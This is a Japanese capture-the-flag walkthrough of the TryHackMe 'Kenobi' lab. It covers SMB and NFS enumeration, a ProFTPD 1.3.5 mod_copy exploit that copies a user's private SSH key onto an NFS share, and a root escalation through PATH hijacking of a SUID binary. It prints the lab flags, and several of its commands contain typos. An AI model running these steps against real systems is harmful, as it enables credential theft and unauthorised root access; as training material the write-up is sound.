## Task1：脆弱なマシンを展開する
### Q：空いているポート数はいくつか
#### 実施コマンド
```bash
nmap 10.10.87.176 -vvv
```
#### 説　明
- Nmapでオープンポートをスキャン
- -vvv
  - より詳細な内容の出力 
#### 解　答
`7個ポート`
  
![image](https://github.com/y-uoh/THM/assets/169203901/cf543112-2015-4d12-8a5a-58b7021dcdef)  
  
## Task2：共有のSambaを列挙
### Q：共有のSambaはいくつか
#### 実施コマンド
```bash
nmap -p 139,445 --script=smb-enum-shares.nse、smb-enum-users.nse 10.10.134.113
```
#### 説　明
- 共有されているSMBを列挙するnse
- SMBには、445と139の２つのポートがある
#### 解　答
`3個`  
  
![image](https://github.com/y-uoh/THM/assets/169203901/2f58c3a4-d160-4a48-bd90-6fde8f1fd598)

### Q：SMBに接続し、共有ファイルを一覧表示する。表示されるファイルは何か
#### 実施コマンド
```bash
smbclient //10.10.134.113/anonymous
ls
```
#### 説　明
- 列挙で見つけたanonymousユーザでsmbにログイン
  - ログインする際のコマンドは`smbclient //<IP>/<ユーザ名>
  - パスワードを聞かれるがanonymousユーザは何を入力してもログインできる
- lsでカレントディレクトリ内のファイルを出力
#### 解　答
`log.txt`
  
![image](https://github.com/y-uoh/THM/assets/169203901/c990e288-f1fd-4ad1-a948-816575ef2818)
  
### Q：FTPはどのポートで実行されているか
#### 実施コマンド
```bash
smbget smb://10.10.134.113/anonymous/log.txt
ls
cat log.txt
```
#### 説　明
- SMBの共有ファルダからlog.txtを発見したので、smbgetでローカルにダウンロード
  - `smbgetコマンド`は**smbからファイルやフォルダをダウンロード**できるwgetのようなコマンド
  - `-Rオプション`を付ければ**SMB共有を再帰的にダウンロード**することも可能
  - `anonymousユーザ`なので、ID/PWは何も送らずでよい
- lsでダウンロードを確認して、catで中身を確認
#### 解　答
21番ポート
  
![image](https://github.com/y-uoh/THM/assets/169203901/b9f51db6-c546-40d1-8588-5a1c4541a4e3)  
![image](https://github.com/y-uoh/THM/assets/169203901/d643274c-90a5-4741-9015-e7f1f0356c72)
  
### Q：nmapによるオープンポートの列挙で、ポート111/tcpでrpcbindサービスが実行されているのがわかった。この場合のポート111はNFCへのアクセスを示している。これは何にマウントしているか
#### 実施コマンド
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.134.113
```
#### 説　明
- nfsに関連する情報を取得するnseたち
- 特に`nfs-showmount`がマウントしているディレクトリを表示してくれるので役立つ
#### 解　答
`/var`  
  
![image](https://github.com/y-uoh/THM/assets/169203901/fa9de575-40ed-4a0e-aa58-415770d2001b)  
  
## Task3：ProFtpdで初期アクセスを取得する
### Q：ProFtpdのバージョンは何か
#### 実施コマンド
```bash
namp -sV 10.10.134.113
```
#### 別解（公式）
```bash
nc 10.10.134.113 21
```
#### 説　明
- `nmap -sV`は、OpenPortとそこで起動しているサービス、及びそのバージョンを出力する
- `netcat`で接続しに行けば接続先のサービスとバージョンが表示される。公式の解答はこっち
#### 解　答
`ProFTPD 1.3.5`  
  
![image](https://github.com/y-uoh/THM/assets/169203901/117d7468-5b7b-4dd0-a3ac-3a190754ec9f)  
![image](https://github.com/y-uoh/THM/assets/169203901/50355d77-c9cc-4fa2-9cb8-ada4f9a0b242)  
  
### Q：Searchsploitを使用して、ProFTPDのエクスプロイトがいくつあるか探索せよ
#### 実施コマンド
```bash
searchsploit ProFTPD 1.3.5
```
#### 説　明
- `searchsploit <サービス名> <バージョン名>`でエクスプロイトを検索できる
#### 解　答
`4個`  
  
![image](https://github.com/y-uoh/THM/assets/169203901/74bf6d75-3027-4414-8f09-77790751617e)  
  
### Q：kenobiのユーザフラグ(/home/kenobi/user.txt)は何か
#### ここまでの整理
- 当該端末は、NSFを使用し、共有フォルダとして`/varをマウント`している
- 当該端末は、FTPサーバーに`ProFTPD1.3.5`を使用している
- `ProFTPD1.3.5`には、`mod_copyというモジュール`があり、それには`リモートから任意のファイルをコピー`できるという脆弱性が報告されている
- `SMB`の共有フォルダにあった`log.txt`から、FTPにリモートログインするために`kenobiというユーザ`がSSHキーを生成し、`/home/kenobi/.ssh/id_rsa`に保存している

#### 整理した内容からのOCの列挙
- `mod_copyモジュール`を使い、`/home/kenobi/.ssh/id_rsa`をコピーしたのち、NFSの共有ディレクトリ`/var`にペーストできれば、`SSHキー`を手に入れることが可能となる
  - `mod_copyモジュール`を使用できるコマンドは`SITE CPFR /home/kenobi/.ssh/id_rsa`
  - `SITE CPFR`でコピーしたファイルをペーストするコマンドは`SITE CPTO /var/tmp/id_rsa` ※敢えて/var/tmpの中に書き込んでいる
- `/home/kenobi/.ssh/id_rsa`を配送するための手段として、`/mntに共有ディレクトリ（今回はkenobiNFS）を作成`し、`/var`と共有できる状態を作る
  - NSFとマウントさせるコマンドは、`mount 10.10.134.113:/var /mnt/kenobiNFS`  

#### 実施コマンド
#### phase1：id_ProFTPDの脆弱性を突く
```bash
nc 10.10.134.113 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```  
![image](https://github.com/y-uoh/THM/assets/169203901/add6dce7-3b6f-4330-84b6-a7b972a97b44)  
  
#### 説　明
- netcatでFTPに接続 -> `nc 10.10.134.113 21`
- `ProFTPD1.3.5`の`mod_copy`モジュールの脆弱性を突いて、任意のユーザのファイルをコピーし、NFSの共有ディレクトリにペースト
  - `kenobiユーザーのSSHキー`をコピー -> `SITE CPFR /home/kenobi/.ssh/id_rsa`
  - コピーしたファイルを`NFSの共有ディレクトリにペースト` -> `SITE CPTO /var/tmp/id_rsa`
  
### phase2：NFSを使って配送
```bash
sudo mkdir /mnt/kenobiNFS
sudo mount 10.10.18.4:/var /mnt/kenobiNFS
ls -al /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
ls
```  
  
![image](https://github.com/y-uoh/THM/assets/169203901/904b6fef-ab11-4b46-b2e4-3dac55e7f9e5)  
![image](https://github.com/y-uoh/THM/assets/169203901/3511b5e7-31ba-40a6-981c-bc49394dc35f)  
  
#### 説　明
- `mkdir /mnt/kenobiNFS`
  - NFSにマウントするためのディレクトリを/mnt配下に作成
- `mount 10.10.18.4:/var /mnt/kenobiNFS`
  - NFSサーバー`(10.10.18.4)`の`共有ディレクトリ/var`をローカルの`/mnt/kenobiNFS`にマウント
  - 以後、`NFSサーバーの/var`と`ローカルの/mnt/kenobiNFS`は共有ディレクトリとして繋がっている状態になる
- `ls -al /mnt/kenobiNFS`
  - マウントの確認。`/var`内が確認できる
- `cp /mnt/kenobiNFS/tmp/id_rsa .`
  - `/mnt/kenobiNFS/tmp/id_rsa`をカレントディレクトリにコピー
- `ls`
  - `id_rsa`があるか確認

#### phase3：SSH接続からユーザフラグ(/home/kenobi/user.txt)の獲得
```bash
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.18.4
ls -al
cat user.txt
```  
  
![image](https://github.com/y-uoh/THM/assets/169203901/6d9dc545-fa0d-482d-9016-f0ed0e4d7e2f)  
  
#### 説　明
- `sudo chmod 600 id_rsa`
  - `id_rsa`の権限変更
  - 600で使用可能に
- `ssh -i id_rsa kenobi@10.10.18.4`
  - ssh接続
  - `ssh -i <sshkeyのパス>`で、sshキーのパスを指定して接続できる
- `ls -al`
  - ログイン後のカレントディレクトリの確認
- `cat user.txt`
  - ユーザフラグの確認  
    
#### 解　答
ユーザーフラグ -> `d0b0f3f53b6caa532a83915e19224899`
  
## Task4：SUIDの操作による権限昇格
### Q：SUIDビットを持つ異常なファイルはどれか
#### 実施コマンド
```bash
find / -type f -perm -4000 2>/dev/null
```
#### 別解（公式）
```bash
find / -perm -u=s -type f 2>/dev/null
```
#### 説　明
- `find / -type f -perm -4000 2>/dev/null`,`find / -perm -u=s -type f 2>/dev/null`
  - SUIDの設定があるファイルを検索
  - ２つは、検索手法の違いなだけでどっちを実行しても結果は同じ
#### 解　答
`/usr/bin/menu`  
色々出てきて何が異状か分からなかったため、ブルートフォースで解答を提出し導く  
いろんな人のwrite up曰く、  
> /usr/bin/menuというコマンドが見慣れない  
という発想から`怪しいものに見当をつける`のが妥当な考え方っぽい  
  
![image](https://github.com/y-uoh/THM/assets/169203901/e705b513-ca23-4db6-94d8-67bca0318ec0)  
  
### Q：異常なファイルには、オプションがいくつあるか
#### 実施コマンド
```bash
menu
```
#### 説　明
- `menu`
  - とりあえず実行してみて何が起きるか確認
  -  ３つのオプションを選択することができ、選択することで色々なステータスが出力されることを確認  
  
![image](https://github.com/y-uoh/THM/assets/169203901/9bf9bc44-6e48-48a7-b328-033b819c833a)  
  
#### 解　答
`3個`  
  
![image](https://github.com/y-uoh/THM/assets/169203901/7287eefb-c581-4226-8528-eb0dd138436a)  
  
### Q：権限昇格を実行し、ルートフラグ(/root/root.txt）を取得せよ
#### phase1：状況の確認
#### 実施コマンド
```bash
menu
strings /usr/bin/menu
curl -I localhost
```
#### 説　明
- `menu`
  - とりあえず実行してみて何が起きるか確認
  -  ３つのオプションを選択することができ、選択することで色々なステータスが出力されることを確認
- `strings /usr/bin/menu`
  - `stringsコマンド`はコマンドのバイナリを読み込み、可読可能な文字列を抽出して出力するコマンド
  - ３つのオプションはそれぞれ`curl -I hocalhost`,`uname -r`,`ifconfig`コマンドにマッピングされていることが分かる
- `curl -I locakhost`
  - 実際にマッピングされているか検証
  - `menuコマンド`でオプションに`1`を選択したときと同じ出力になったことから、オプション1は`curl -I hocalhost`にマッピングされていることを証明  
  
![image](https://github.com/y-uoh/THM/assets/169203901/7287eefb-c581-4226-8528-eb0dd138436a)  
![image](https://github.com/y-uoh/THM/assets/169203901/9bf9bc44-6e48-48a7-b328-033b819c833a)  
![image](https://github.com/y-uoh/THM/assets/169203901/d5c73f00-4f5a-43b7-ac1b-bcbcfa30dbc3)  
  
#### phase2：権限昇格
#### 状況の整理
- menuコマンドにはSUIDフラグが設定されているため、どのユーザで実行してもroot権限で実行される
- menuコマンドを実行しオプション番号を選択すると、それぞれ他のコマンドが実行される
- 実行されるコマンドは、完全なパスを明示的に指定していない
#### 整理した内容からOCの列挙
- オプションで実行されるコマンドはパスを通して実行されるため、オプションで実行されるコマンドと同じ名前の別のコマンドを作成し、パスを置き換える
- 置き換えたファイルの内容がshellを実行するファイルにすれば、そこで実行されるshellはrootで実行されることになり、権限昇格ができる  
  
#### 実行したコマンド
```bash
echo /bin/bash > curl
sudo chmod 777 crul
export PATH=/home/kenobi/curl:$PATH
manu
whoami
cat /root/root.txt
```  
  
#### 説　明
- `echo /bin/bash > curl`
  - `curl`というファイルに、`/bin/bash`を書き込む
- `sudo chmod 777 curl`
  - curlファイルの`実行権限を無敵状態`にする
- `export PATH=/home/kenobi/curl:$PATH`
  - curlファイルを`環境変数PATH`に追加する
  - これでパス指定しなくても、curlと打つだけで実行可能となる
- `manu`
  - manuコマンドを実行し、`curl -I hocalhost`が実行される、`オプション1`を選択する
  - curlはすでに置き換えられているので、置き換えたcurlファイルが実行され、中に記載された`/bin/bash`が`root`で実行される
- `whoami`
  - 念のため確認
- `cat /root/root.txt`
  - ルートフラグを取得  
  
#### 解　答
ルートフラグ：`177b3cd8562289f37382721c28381f02`  
  
![image](https://github.com/y-uoh/THM/assets/169203901/1ebf17f6-4ae9-4dec-a9ce-56b585f35b4d)  
  
## 参　考
### Nmapポートスキャンテクニック
[Nmapによるポートスキャンの基礎 - Qiita](https://qiita.com/kenryo/items/1b49bddce44e9412638f)  
[Nmapスキャンの全コマンド・オプションを日本語解説](https://at-virtual.net/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3/namp%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3%E3%81%AE%E5%85%A8%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%83%BB%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E6%97%A5%E6%9C%AC%E8%AA%9E%E8%A7%A3/)  
  
### nseスクリプトの探索
#### スクリプトが格納されているディレクトリ
`/usr/share/namp/scripts`  
#### 探索要領一例
`grep -rl <探索したい文字列> /usr/share/nmap/scripts`  
> `grep`で`/usr/share/nmap/scripts`内にある探索文字列が含まれるスクリプトを出力する
> rオプション -> ディレクトリを指定した場合は、そのサブディレクトリ内も検索
> lオプション -> 一致するものを含むファイル名のみ抽出する
  
### SMBコマンド
[smbclientコマンド - Qiita](https://qiita.com/ss12345/items/4bcd603d12f7df2f6a06)  
[smbgetコマンド](https://www.samba.gr.jp/project/translation/4.0/htmldocs/manpages/smbget.1.html)  
  
### RCP/Remote Procedure Callとは
>RCP(Remote Procedure Call)とは、ネットワーク上で接続された他のコンピュータのプログラムを呼び出して実行させるための技術、またはそのためのプロトコル  
  
[そもそもRPCってなんだ - Qiita](https://qiita.com/il-m-yamagishi/items/8709de06be33e7051fd2)
[3分で「わかった気」になる RPC【改訂２版】 - Qiita](https://qiita.com/mmake/items/7d4bfb45c3aa8b34a983)  
  
### rpcbind
> RPC用の番号をポート番号に対応づける機能
> RPC用マッピングサービスともいう  
  
[【Unix入門】rpcbindとは](https://www.mtioutput.com/entry/2019/01/24/090000)
  
### NFS/Network File Systemとは
> ネットワーク上のコンピュータが持つストレージを共有するための仕組みのこと
> ネットワークファイルシステムという名前の通り、ネットワークを介してサーバ上のストレージ領域をローカルストレージと同様にマウントして使えるのが特徴
> このため、NFSであることを意識する必要がなく、ローカルストレージと同様に読み書きすることが可能なため、幅広い用途で使えるのが利点  
  
#### NFBのマウントとは
> NFSサーバーの公開されたディレクトリをネットワーク越しにマウントすることで、複数のホストから同じファイルを共有することができる  
> マウントとは、`マウントする`といった使い方をするように動詞にあたるため、`NFSで/verをマウントする`というと、`/varを公開ディレクトリにする`といった文脈になる  
> 上記から`NFSでマウントされたディレクトリ`というと、`NFSでの共有ディレクトリ`といった意味合いになる。  
  
[NFSとは？ - Qiita](https://qiita.com/morinskyy/items/3128815b022706ea2542)  
[NFSとSMBの違い -SEの道標](https://milestone-of-se.nesuke.com/sv-advanced/file-server/nfs-cifs-smb-summary/)  
[NFSとは - OSSのデージーネット](https://www.designet.co.jp/faq/term/?id=TkZT#:~:text=NFS%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E3%81%AF%E3%80%81NFS%E3%82%B5%E3%83%BC%E3%83%90,%E5%85%B1%E6%9C%89%E3%81%99%E3%82%8B%E3%81%93%E3%81%A8%E3%81%8C%E3%81%A7%E3%81%8D%E3%82%8B%E3%80%82)
  
### ProFtpd
> FTPサーバーのひとつ  
  
[ProFTPD - LinuC](https://linuc.org/study/knowledge/486/)
  
### netcatコマンド
#### 相手とTCP接続を開く
`nc <hostname or IPaddress> <Port>`  
#### 接続を待ち受ける
`nc -l <Port>`  
  
[nc(netcat)コマンドの説明と使い方について - Qiita](https://qiita.com/boccham/items/536bf9201eec81c617d5)  
  
### Searchsploit
> serchsploitは、エクスプロイトデータベースのコマンドライン検索ツール  
  
[脆弱性とエクスプロイトについて理解する - Qiita](https://qiita.com/Brutus/items/5b0d332b1f3fd57b714f)
[searchsploitマニュアル - EXPLOIT DATABASE](https://www.exploit-db.com/searchsploit)  
  
### /mntとは
> /mntとは、Linuxシステムにおけるマウントポイントを表すディレクトリ
> マウントポイントとは、外部デバイスやファイルシステムなどをLinuxファイルシステムの一部としてアクセスするために使用される
> Linuxでは、デバイス（ハードウェア、USBなど）やネットワーク上のリソース（NFSやSMBなど）を`ファイルシステムツリーに組み込むプロセス`を`マウント`と呼んでいる  
  
#### mount
```bash
mount /dev/sdb1 /mnt
```    
このコマンドを実行すると、sdb1として認識されているハードウェアをソフトウェア的に認識させることができる  
`/dev/sdb1`：デバイスファイル
`/mnt`：マウントポイント  
#### umount
```bash
umount /mnt
```    
/mntにマウントしているデバイスをアンマウントすることができる
```bash
umount /dev/sdb1
```    
上記のように、マウントしているデバイスを指定してアンマウントすることも可能  
  
[Linux　mntってなに - Qiita](https://qiita.com/a999/items/ea9766548a73b86fdfea)  
[【Linux】mount, umountについて - Qiita](https://qiita.com/yuta3003/items/6b76d5cb7ce79d000359)  
  
### stringsコマンド
> 「strings」コマンドは、バイナリファイルを読み込み、その中に含まれる印刷可能な文字列を抽出して表示するツール  
> バイナリファイルの中身を調査する際やデバック時に非常に役立つ  
  
#### 基本的な使い方
```bash
strings <ファイル名>
```  
  
[strings command - Qiita](https://qiita.com/boccham/items/5ffcf94d983d01f0aa2e)  
  
### PATH環境変数
> コマンドが格納されているPATHを登録すること
> PATHを通すことで、いちいちコマンドのフルパスを指定せずに実行することができるようになる  
  
#### PATH環境変数の追加
```bash
export PATH=<追加したいPATH>:$PATH
```  
  
最後の`:$PATH`がPATHを追加することを指示しており、もしこれを付けないと、既に設定されているパスを全消しすることになるので注意  
  
[Pathを通すとは、環境変数とは - Qiita](https://qiita.com/fuwamaki/items/3d8af42cf7abee760a81)


## フレームワーク　※コピーして使用！
## Task：
### Q：
#### 実施コマンド
```bash

```
#### 説　明
- 
- 
#### 解　答
  

 
  

